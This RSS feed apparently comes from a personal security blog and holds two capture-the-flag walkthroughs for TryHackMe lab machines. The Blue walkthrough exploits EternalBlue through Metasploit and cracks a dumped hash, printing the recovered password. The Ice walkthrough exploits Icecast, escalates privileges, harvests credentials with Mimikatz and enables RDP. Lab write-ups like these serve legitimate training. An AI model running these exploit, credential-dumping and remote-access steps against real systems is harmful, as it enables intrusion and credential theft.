<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>windows on ~/r4sso.github.io</title>
        <link>https://r4sso.github.io/tags/windows/</link>
        <description>Recent content in windows on ~/r4sso.github.io</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-uk</language>
        <lastBuildDate>Tue, 01 Feb 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://r4sso.github.io/tags/windows/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>Blue (TryHackMe)</title>
        <link>https://r4sso.github.io/p/blue-tryhackme/</link>
        <pubDate>Tue, 01 Feb 2022 00:00:00 +0000</pubDate>
        
        <guid>https://r4sso.github.io/p/blue-tryhackme/</guid>
        <description>&lt;img src="https://i.imgur.com/6Ijftag.png" alt="Featured image of post Blue (TryHackMe)" /&gt;&lt;p&gt;Room: &lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/blue&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;tryhackme.com/room/blue&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;reconnaissance&#34;&gt;Reconnaissance&lt;/h2&gt;
&lt;p&gt;First we need to do Reconnaissance.
Just another port scanning :D&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ nmap -sV -vv --script vuln TARGET-IP
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;task-1---question&#34;&gt;Task 1 - Question&lt;/h3&gt;
&lt;p&gt;Port under 1000?
&lt;img src=&#34;https://r4sso.github.io/images/blue01.jpg&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;nmap-port&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;What is this machine vulnerable to?
&lt;img src=&#34;https://r4sso.github.io/images/blue02.jpg&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;nmap-vuln&#34;
	
	
&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;gain-access&#34;&gt;Gain Access&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Start metasploit&lt;/li&gt;
&lt;li&gt;Search an exploit for &lt;strong&gt;(ms170-010)&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Use the exploit&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msf&amp;gt; exploit/windows/smb/ms17_010_eternalblue
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ol&gt;
&lt;li&gt;Set &lt;strong&gt;RHOSTS&lt;/strong&gt; value&lt;/li&gt;
&lt;li&gt;Set payload&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; payload windows/x64/shell/reverse_tcp
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ol&gt;
&lt;li&gt;Run the exploit &amp;amp; pray :D&lt;/li&gt;
&lt;li&gt;If succeed. Background this shell &lt;strong&gt;(CTRL+Z)&lt;/strong&gt;
&lt;img src=&#34;https://r4sso.github.io/images/blue03.jpg&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;blue-session&#34;
	
	
&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h2 id=&#34;escalate&#34;&gt;Escalate&lt;/h2&gt;
&lt;p&gt;Escalate privileges &amp;amp; upgrade shells in metasploit.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Search &lt;strong&gt;shell_to_meterpreter&lt;/strong&gt; - Result: &lt;strong&gt;post/multi/manage/shell_to_meterpreter&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Use it :D&lt;/li&gt;
&lt;li&gt;set session &amp;amp; run (be patient &amp;amp; wait)
&lt;!-- raw HTML omitted --&gt;(NOTE: If you dont know how, go back &amp;amp; learn to use metasploit :D)
&lt;img src=&#34;https://r4sso.github.io/images/blue04.jpg&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;blue-meterpreter&#34;
	
	
&gt;&lt;/li&gt;
&lt;li&gt;List all of the processes running via thex &amp;lsquo;ps&amp;rsquo; command. Just because we are system doesn&amp;rsquo;t mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).
&lt;img src=&#34;https://r4sso.github.io/images/blue05.jpg&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;blue-ps&#34;
	
	
&gt;&lt;/li&gt;
&lt;li&gt;Migrate to this process using the &amp;lsquo;migrate PROCESS_ID&amp;rsquo; command where the process id is the one you just wrote down in the previous step.
&lt;img src=&#34;https://r4sso.github.io/images/blue06.jpg&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;blue-migrate&#34;
	
	
&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h2 id=&#34;cracking&#34;&gt;Cracking&lt;/h2&gt;
&lt;p&gt;Dump the non-default user&amp;rsquo;s password and crack it!&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Within our elevated meterpreter shell, dump all of the passwords.
&lt;img src=&#34;https://r4sso.github.io/images/blue07.jpg&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;blue-dump&#34;
	
	
&gt;&lt;/li&gt;
&lt;li&gt;Copy the password hash &amp;amp; crack it.&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ hashcat -a &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; -m &lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; crack.txt /usr/share/wordlists/rockyou.txt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Result: &lt;strong&gt;Jon:alqfna22&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;find-flags&#34;&gt;Find flags!&lt;/h2&gt;
&lt;h3 id=&#34;flag-1&#34;&gt;Flag 1&lt;/h3&gt;
&lt;p&gt;Hint: Can you &amp;ldquo;C&amp;rdquo; it? So flag1 is located on C:\&lt;/p&gt;
&lt;h3 id=&#34;flag-2&#34;&gt;Flag 2&lt;/h3&gt;
&lt;p&gt;Hint: I wish I wrote down where I kept my password. Luckily it&amp;rsquo;s still stored here on Windows.
&amp;ldquo;On Windows&amp;rdquo; maybe is on \Windows\ ? :V&lt;/p&gt;
&lt;h3 id=&#34;flag-3&#34;&gt;Flag 3&lt;/h3&gt;
&lt;p&gt;This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.&lt;/p&gt;
&lt;p&gt;Maybe is located on \User\Documents\ ?&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Ice (TryHackMe)</title>
        <link>https://r4sso.github.io/p/ice-tryhackme/</link>
        <pubDate>Tue, 01 Feb 2022 00:00:00 +0000</pubDate>
        
        <guid>https://r4sso.github.io/p/ice-tryhackme/</guid>
        <description>&lt;img src="https://i.imgur.com/6Ijftag.png" alt="Featured image of post Ice (TryHackMe)" /&gt;&lt;p&gt;Room: &lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/ice&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;tryhackme.com/room/ice&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;reconnaissance&#34;&gt;Reconnaissance&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;run nmap w/ -p-, -A might useful :D
&lt;img src=&#34;https://r4sso.github.io/images/ice00.jpg&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;ice-scan&#34;
	
	
&gt;
OS-Information:
&lt;img src=&#34;https://r4sso.github.io/images/ice01.jpg&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;ice-os&#34;
	
	
&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h2 id=&#34;gain-access&#34;&gt;Gain Access&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Find more information about the vulnerability.&lt;/li&gt;
&lt;/ol&gt;
&lt;!-- raw HTML omitted --&gt;
&lt;p&gt;Hint: [execute arbitrary code in an unauthenticated fashion./ From 2004]
&lt;img src=&#34;https://r4sso.github.io/images/ice02.jpg&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;ice-cve&#34;
	
	
&gt;
Seem matched w/ the hint :D&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Start metasploit&lt;/li&gt;
&lt;li&gt;Search exploit for icecast &amp;amp; use it :D&lt;/li&gt;
&lt;li&gt;Set options required &amp;amp; run.&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h2 id=&#34;escalate&#34;&gt;Escalate&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Once you get into meterpreter shell&lt;/li&gt;
&lt;li&gt;Gain information about the system target&lt;/li&gt;
&lt;li&gt;run the following command &lt;strong&gt;&lt;code&gt;run post/multi/recon/local_exploit_suggester&lt;/code&gt;&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Once you get the exploit including &amp;ldquo;eventwr&amp;rdquo;. Background this shell &lt;strong&gt;(CTRL+Z)&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Use the exploit you get before &amp;amp; set options required.&lt;/li&gt;
&lt;li&gt;Yolo!
&lt;img src=&#34;https://r4sso.github.io/images/ice03.jpg&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;ice-privec&#34;
	
	
&gt;&lt;/li&gt;
&lt;li&gt;We can now verify that we have expanded permissions using the command &lt;code&gt;getprivs&lt;/code&gt;.&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h2 id=&#34;looting&#34;&gt;Looting&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Migrate to &amp;ldquo;spool&amp;rdquo;&lt;/li&gt;
&lt;li&gt;Let&amp;rsquo;s check what user we are now with the command &lt;code&gt;getuid&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Use Mimikatz, &lt;code&gt;load kiwi&lt;/code&gt;
&lt;img src=&#34;https://r4sso.github.io/images/ice04.jpg&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;ice-kiwi&#34;
	
	
&gt;&lt;/li&gt;
&lt;li&gt;Retrieve all credentials w/ kiwi
&lt;img src=&#34;https://r4sso.github.io/images/ice05.jpg&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;ice_creds&#34;
	
	
&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h2 id=&#34;post-exploitation&#34;&gt;Post-Exploitation&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Question 1-5 (help)&lt;/li&gt;
&lt;li&gt;Enable rdp &lt;code&gt;run post/windows/manage/enable_rdp&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
</description>
        </item>
        
    </channel>
</rss>
